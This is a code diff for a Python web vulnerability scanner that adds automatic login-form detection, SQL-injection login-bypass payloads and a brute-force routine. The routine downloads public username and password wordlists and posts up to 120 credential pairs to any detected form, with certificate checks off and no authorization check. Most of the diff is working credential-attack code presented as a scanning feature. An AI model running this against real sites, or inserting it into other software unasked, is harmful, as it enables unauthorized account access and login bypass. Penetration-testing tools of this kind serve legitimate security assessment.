@@ -841,6 +841,24 @@ class VulnerabilityEngine:
     XXE_INDICATORS = ['root:', '/etc/passwd', 'file:///etc/passwd', 'external entity', 'entity expansion']
     SSRF_INDICATORS = ['169.254.169.254', 'instance-id', 'metadata', 'ec2', 'gce', 'openstack']
 
+    LOGIN_KEYWORDS = ['login', 'signin', 'sign in', 'username', 'password', 'auth', 'authenticate']
+    BRUTE_FORCE_CREDENTIALS = [
+        ('admin', 'admin'), ('admin', 'password'), ('root', 'root'),
+        ('test', 'test'), ('user', 'user'), ('guest', 'guest')
+    ]
+    WORDLIST_BASE_URL = 'https://raw.githubusercontent.com/kkrypt0nn/wordlists/main/wordlists'
+    USERNAME_WORDLISTS = [
+        'usernames/multiple_sources_users.txt',
+        'usernames/xato_net_usernames.txt'
+    ]
+    PASSWORD_WORDLISTS = [
+        'passwords/most_used_passwords.txt',
+        'passwords/password.txt'
+    ]
+    WORDLIST_CACHE_DIR = Path('.wordlist_cache')
+    WORDLIST_MAX_ENTRIES = 60
+    SQLI_LOGIN_PAYLOADS = ["' OR '1'='1", '" OR "1"="1"', "' OR 1=1--", "' OR 'a'='a"]
+
     def scan_web(self, target: str) -> List[Dict]:
         """Full web vulnerability scan with validation and WAF detection."""
         findings = []
@@ -867,6 +885,27 @@ class VulnerabilityEngine:
         params = self._extract_params(target)
         waf_hits = []
         seen_titles = set()
+
+        login_info = self._detect_login_page(baseline.get('body', ''))
+        if login_info.get('detected'):
+            login_results = self._attempt_login_bruteforce(target, login_info, baseline)
+            for result in login_results:
+                if result['title'] in seen_titles:
+                    continue
+                seen_titles.add(result['title'])
+                findings.append(result)
+                db.add_finding(
+                    target,
+                    'scan',
+                    result['severity'],
+                    result['title'],
+                    result['description'],
+                    result['evidence'],
+                    result['remediation'],
+                    result['cvss'],
+                    result['confidence'],
+                    owasp=result.get('owasp', '')
+                )
 
         for vuln_type, payloads in self.PAYLOADS.items():
             for payload in payloads:
@@ -935,6 +974,85 @@ class VulnerabilityEngine:
             return parsed._replace(fragment='').geturl()
         return url
 
+    def _download_wordlist(self, relative_path: str, max_lines: int = 60) -> List[str]:
+        self.WORDLIST_CACHE_DIR.mkdir(exist_ok=True)
+        cache_path = self.WORDLIST_CACHE_DIR / relative_path.replace('/', '_')
+        if cache_path.exists():
+            try:
+                lines = [line.strip() for line in cache_path.read_text(encoding='utf-8', errors='ignore').splitlines() if line.strip()]
+                return lines[:max_lines]
+            except Exception:
+                pass
+
+        try:
+            url = f"{self.WORDLIST_BASE_URL}/{relative_path}"
+            resp = requests.get(url, timeout=15, verify=False)
+            if resp.ok:
+                lines = [line.strip() for line in resp.text.splitlines() if line.strip()]
+                try:
+                    cache_path.write_text('\n'.join(lines), encoding='utf-8')
+                except Exception:
+                    pass
+                return lines[:max_lines]
+        except Exception:
+            pass
+        return []
+
+    def _load_bruteforce_usernames(self) -> List[str]:
+        usernames = []
+        for path in self.USERNAME_WORDLISTS:
+            usernames.extend(self._download_wordlist(path, self.WORDLIST_MAX_ENTRIES))
+            if len(usernames) >= self.WORDLIST_MAX_ENTRIES:
+                break
+        if not usernames:
+            usernames = [u for u, _ in self.BRUTE_FORCE_CREDENTIALS]
+        return list(dict.fromkeys(usernames))[:self.WORDLIST_MAX_ENTRIES]
+
+    def _load_bruteforce_passwords(self) -> List[str]:
+        passwords = []
+        for path in self.PASSWORD_WORDLISTS:
+            passwords.extend(self._download_wordlist(path, self.WORDLIST_MAX_ENTRIES))
+            if len(passwords) >= self.WORDLIST_MAX_ENTRIES:
+                break
+        if not passwords:
+            passwords = [p for _, p in self.BRUTE_FORCE_CREDENTIALS]
+        return list(dict.fromkeys(passwords))[:self.WORDLIST_MAX_ENTRIES]
+
+    def _attempt_login_sqli(self, post_url: str, username_field: str, password_field: str, baseline: Dict[str, Any]) -> Optional[Dict[str, Any]]:
+        for payload in self.SQLI_LOGIN_PAYLOADS:
+            try:
+                resp = requests.post(
+                    post_url,
+                    data={username_field: payload, password_field: payload},
+                    timeout=8,
+                    verify=False,
+                    allow_redirects=True
+                )
+                body = resp.text or ''
+                normalized = self._normalize_text(body)
+                sql_error = any(err in normalized for err in self.SQL_ERROR_INDICATORS)
+                login_failed = any(term in normalized for term in ['invalid', 'incorrect', 'failed', 'error', 'try again', 'unauthorized'])
+                login_page_still = any(term in normalized for term in ['login', 'username', 'password', 'sign in', 'signin'])
+                success_redirect = bool(resp.history) or (resp.url and 'login' not in resp.url.lower() and 'signin' not in resp.url.lower())
+
+                if sql_error or success_redirect or (not login_failed and not login_page_still and normalized != baseline.get('body', '')):
+                    evidence = f"POST {post_url} -> {username_field}={payload} | {password_field}={payload} | status {resp.status_code}\n{body[:300]}"
+                    return {
+                        'vulnerable': True,
+                        'confirmed': success_redirect and not sql_error,
+                        'title': 'Login form SQL injection candidate',
+                        'description': 'Potential SQL injection or login bypass was observed against the authentication form. This requires manual verification.',
+                        'evidence': evidence,
+                        'remediation': 'Sanitize authentication inputs, parameterize database queries, and enforce strict login validation.',
+                        'cvss': 6.5,
+                        'confidence': 0.65,
+                        'severity': 'medium',
+                        'owasp': 'A03:2021'
+                    }
+            except Exception:
+                continue
+        return None
+
     def _get_baseline_response(self, target: str) -> Dict[str, Any]:
         try:
             baseline_url = target if target.startswith('http') else f"http://{target}"
@@ -954,6 +1072,111 @@ class VulnerabilityEngine:
         if resp.status_code in [403, 406, 429, 501] and any(ind in lowered for ind in self.WAF_INDICATORS):
             return True
         return any(ind in lowered for ind in self.WAF_INDICATORS)
+
+    def _detect_login_page(self, body: str) -> Dict[str, Any]:
+        lowered = body.lower()
+        if '<form' not in lowered or 'password' not in lowered:
+            return {'detected': False}
+
+        if not any(keyword in lowered for keyword in self.LOGIN_KEYWORDS):
+            return {'detected': False}
+
+        action_match = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', body, re.I)
+        action = action_match.group(1).strip() if action_match else ''
+        username_field = self._find_input_name(body, ['username', 'user', 'email', 'login'])
+        password_field = self._find_input_name(body, ['password', 'pass', 'pwd'])
+        return {
+            'detected': True,
+            'action': action,
+            'username_field': username_field,
+            'password_field': password_field
+        }
+
+    def _find_input_name(self, html: str, names: List[str]) -> str:
+        for match in re.finditer(r'<input[^>]*name=["\']([^"\']+)["\']', html, re.I):
+            input_name = match.group(1)
+            for candidate in names:
+                if candidate in input_name.lower():
+                    return input_name
+        return names[0]
+
+    def _attempt_login_bruteforce(self, target: str, login_info: Dict[str, Any], baseline: Dict[str, Any]) -> List[Dict[str, Any]]:
+        results = []
+        base_url = target if target.startswith('http') else f'http://{target}'
+        post_url = login_info.get('action') or base_url
+        if post_url.startswith('/'):
+            parsed = urlparse(base_url)
+            post_url = f"{parsed.scheme}://{parsed.netloc}{post_url}"
+        elif not post_url.startswith('http'):
+            post_url = base_url.rstrip('/') + '/' + post_url.lstrip('/')
+
+        username_field = login_info.get('username_field', 'username')
+        password_field = login_info.get('password_field', 'password')
+
+        sqli_result = self._attempt_login_sqli(post_url, username_field, password_field, baseline)
+        if sqli_result:
+            results.append(sqli_result)
+            if sqli_result.get('confirmed'):
+                return results
+
+        usernames = self._load_bruteforce_usernames()
+        passwords = self._load_bruteforce_passwords()
+        credentials = []
+        for username in usernames:
+            for password in passwords:
+                credentials.append((username, password))
+                if len(credentials) >= 120:
+                    break
+            if len(credentials) >= 120:
+                break
+
+        if not credentials:
+            credentials = self.BRUTE_FORCE_CREDENTIALS
+
+        for username, password in credentials:
+            try:
+                resp = requests.post(
+                    post_url,
+                    data={username_field: username, password_field: password},
+                    timeout=8,
+                    verify=False,
+                    allow_redirects=True
+                )
+                body = resp.text or ''
+                normalized = self._normalize_text(body)
+                login_failed = any(term in normalized for term in ['invalid', 'incorrect', 'failed', 'error', 'try again', 'unauthorized'])
+                login_page_still = any(term in normalized for term in ['login', 'username', 'password', 'sign in', 'signin'])
+                success_redirect = bool(resp.history) or (resp.url and 'login' not in resp.url.lower() and 'signin' not in resp.url.lower())
+
+                if success_redirect or (not login_failed and not login_page_still and normalized != baseline.get('body', '')):
+                    evidence = f"POST {post_url} -> {username_field}={username} | {password_field}={password} | status {resp.status_code}\n{body[:300]}"
+                    results.append({
+                        'vulnerable': True,
+                        'title': 'Login brute-force successful',
+                        'description': f'Valid credentials discovered during credential testing: {username}/{password}.',
+                        'evidence': evidence,
+                        'remediation': 'Harden authentication, implement account lockout, and replace weak credentials.',
+                        'cvss': 8.5,
+                        'confidence': 0.9,
+                        'severity': 'high',
+                        'owasp': 'A01:2021'
+                    })
+                    return results
+            except Exception:
+                continue
+
+        results.append({
+            'vulnerable': True,
+            'title': 'Login page detected; brute force attempted',
+            'description': 'A login/authentication form was detected and a wordlist-based credential check was attempted. No login was confirmed from this limited set of checks.',
+            'evidence': f'Target: {post_url} | username field: {username_field} | password field: {password_field} | attempted {min(len(credentials), 120)} combos',
+            'remediation': 'Review authentication controls, apply rate limiting, and validate login endpoints manually with a full authorized credential list.',
+            'cvss': 4.0,
+            'confidence': 0.55,
+            'severity': 'low',
+            'owasp': 'A01:2021'
+        })
+        return results
 
     def _test_payload(self, url: str, vuln_type: str, payload: str, baseline: Dict[str, Any]) -> Dict[str, Any]:
         try:
